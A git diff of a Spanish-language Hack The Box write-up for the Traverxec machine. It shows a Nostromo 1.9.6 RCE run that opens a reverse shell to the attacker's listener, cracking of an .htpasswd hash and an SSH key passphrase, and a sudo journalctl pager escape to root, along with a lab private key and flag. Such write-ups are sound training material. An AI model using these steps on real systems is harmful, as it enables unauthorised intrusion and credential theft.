@@ -159,31 +159,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 87.21 seconds
 ```
+## Website
+
+La pagina principal no muestra nada de nada.
 
 ![image-center](/assets/images/Pasted image 20260224165155.png)
+## Shell as www-data
+### Nostromo RCE
 
-```bash
-searchsploit nostromo 1.9.6
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                                            |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-nostromo 1.9.6 - Remote Code Execution                                                                                                                    | multiple/remote/47837.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
+Como el escaneo de `nmap` me mostro que corre `nostromo`, mas en concreto la versión `1.9.6`, busque exploits asociados a esta versión , [encontrando uno](https://github.com/cancela24/CVE-2019-16278-Nostromo-1.9.6-RCE) y así lo baje con el parámetro `-m`.
+### Shell
 
-$ searchsploit -m multiple/remote/47837.py
-  Exploit: nostromo 1.9.6 - Remote Code Execution
-      URL: https://www.exploit-db.com/exploits/47837
-     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
-    Codes: CVE-2019-16278
- Verified: True
-File Type: Python script, ASCII text executable
-Copied to: /home/zsln/Desktop/zsln/Traverxec/47837.py
-
-
-
-$ mv 47837.py exploit.py
-```
+Luego de clonarme el repositorio, solo tenia que rellenar los parámetros junto con la `ip` de la victima y la mía.
 
 ```bash
 python3 poc.py -t 10.129.203.218 -p 80 --attacker-port 4444 --attacker-ip 10.10.17.19
@@ -196,6 +183,8 @@ python3 poc.py -t 10.129.203.218 -p 80 --attacker-port 4444 --attacker-ip 10.10.
 [*] Retrying (1/3)..
 ```
 
+Y desde mi listener `nc` recibí la conexión como el usuario `www-data`.
+
 ```BASH
  sudo nc -nvlp 4444
 listening on [any] 4444 ...
@@ -203,47 +192,30 @@ connect to [10.10.17.19] from (UNKNOWN) [10.129.203.218] 44138
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+### Shell as david
+
+Viendo uno de los dos archivos en /var/nostromo/conf, veo que en el directorio del usuario `david`, hay una carpeta con el nombre `public_www`.
 
 ```BASH
 www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
 # MAIN [MANDATORY]
-
-servername		traverxec.htb
-serverlisten		*
-serveradmin		david@traverxec.htb
-serverroot		/var/nostromo
-servermimes		conf/mimes
-docroot			/var/nostromo/htdocs
-docindex		index.html
-
-# LOGS [OPTIONAL]
-
-logpid			logs/nhttpd.pid
-
-# SETUID [RECOMMENDED]
-
-user			www-data
-
-# BASIC AUTHENTICATION [OPTIONAL]
-
-htaccess		.htaccess
-htpasswd		/var/nostromo/conf/.htpasswd
-
-# ALIASES [OPTIONAL]
-
-/icons			/var/nostromo/icons
-
+<SNIP>
 # HOMEDIRS [OPTIONAL]
 
 homedirs		/home
 homedirs_public		public_www
 ```
+### Login fail
 
+Además hay un archivo con el hash `md5crypt` del password de este usuario.
 
 ```BASH
 www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 ```
+### Crack password
+
+El mismo lo rompí con `john`.
 
 ```bash
 j hash
@@ -260,6 +232,8 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
+Y cuando me quise loguear con dicha contraseña me salía invalida por alguna razón.
+
 ```BASH
 ssh david@traverxec.htb
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
@@ -269,7 +243,9 @@ david@traverxec.htb's password:
 Permission denied, please try again.
 david@traverxec.htb's password:
 ```
+### Backup file
 
+Volviendo al directorio, contaba también con la carpeta `protected-file-area`.
 
 ```BASH
 www-data@traverxec:/var/nostromo/logs$ ls -la /home/david/public_www
@@ -279,6 +255,8 @@ drwx--x--x 5 david david 4096 Oct 25  2019 ..
 -rw-r--r-- 1 david david  402 Oct 25  2019 index.html
 drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
 ```
+
+En la cual dentro de la misma habían dos archivos, uno de ellos un comprimido de un backup.
 
 ```bash
 www-data@traverxec:/tmp$ ls -la ls -la /home/david/public_www/protected-file-area/
@@ -290,6 +268,9 @@ drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
 -rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
 -rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
 ```
+### Crack passphrase
+
+Copie el mismo en la ruta `/tmp`, y luego lo descomprimí con `tar` y `gunzip`, viendo así la clave `rsa` del usuario `david`.
 
 ```bash
 www-data@traverxec:/tmp$ file backup-ssh-identity-files.tgz
@@ -302,7 +283,42 @@ home/david/.ssh/
 home/david/.ssh/authorized_keys
 home/david/.ssh/id_rsa
 home/david/.ssh/id_rsa.pub
+
+<SNIP>
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F
+
+seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
+tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
+KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
+RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
+HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
+Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
+dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
+6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
+xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
+Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
+i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
+fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
+bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
+uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
+Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
+9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
+rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
+4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
+/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
+JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
+XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
+hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
+SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
+j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
+VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
+-----END RSA PRIVATE KEY-----
+
 ```
+
+Probando la misma, me pide una clave, en donde probé la que encontré anteriormente, pero sin éxito.
 
 ```bash
 $ ssh david@traverxec.htb -i id_rsa
@@ -317,9 +333,14 @@ Permission denied, please try again.
 david@traverxec.htb's password:
 ```
 
+Por lo que use `ssh2john` para convertir el contenido de la misma en un hash.
+
 ```bash
 ssh2john id_rsa > hash_rsa
 ```
+### Shell
+
+El mismo lo rompí revelando así la clave que lo desbloquea.
 
 ```bash
 j hash_rsa
@@ -335,6 +356,8 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
+Ahora si usando esta, me conecte por `ssh`.
+
 ```bash
 ssh david@traverxec.htb -i id_rsa
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
@@ -345,6 +368,11 @@ Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_
 david@traverxec:~$  a  cat user.txt
 cdb58089f4a69ea95a79c46f7daf547f
 ```
+## Shell as root
+### Binary abuse
+
+Viendo el directorio personal de `david`, vi que en la carpeta `/bin` hay dos archivos.
+El script parece ejecutar con sudo `journalctl`, un binario que cumple casi la misma función que `systemctl`, viendo en el mismo que ejecuta `unostromo.service`, lo cual no es bueno ya que cuando el propio binario se ejecuta de forma manual, entra en formato `less` cuando las proporciones de la pantalla no son las adecuadas, permitiendo a alguien de bajos privilegios spawnear una shell como `root` ejecutando `!/bin/bash` luego de ejecutarlo manualmente.
 
 ```bash
 david@traverxec:~/bin$ ls
@@ -361,6 +389,9 @@ echo " "
 echo "Last 5 journal log lines:"
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
 ```
+### Shell
+
+Probando mi teoría, ejecute el mismo comando, pero manualmente, viendo que entro en el formato pager o paginador de `less`, por lo que puedo simplemente ejecutar `!/bin/bash`, dándome así una shell como `root`..
 
 ```bash
 david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
@@ -371,9 +402,13 @@ Feb 24 15:22:46 traverxec su[1049]: pam_unix(su:auth): authentication failure; l
 Feb 24 15:22:48 traverxec su[1049]: FAILED SU (to david) www-data on pts/0
 Feb 24 15:46:16 traverxec nhttpd[1018]: /../../../../bin/sh sent a bad cgi header
 !/bin/bash
+
+root@traverxec:~#
 ```
 
 ```bash
 root@traverxec:~# cat root.txt
-f744886dafeb233ea5b4181cef14f548
+f74488...
 ```
+
+`~Happy Hacking.`
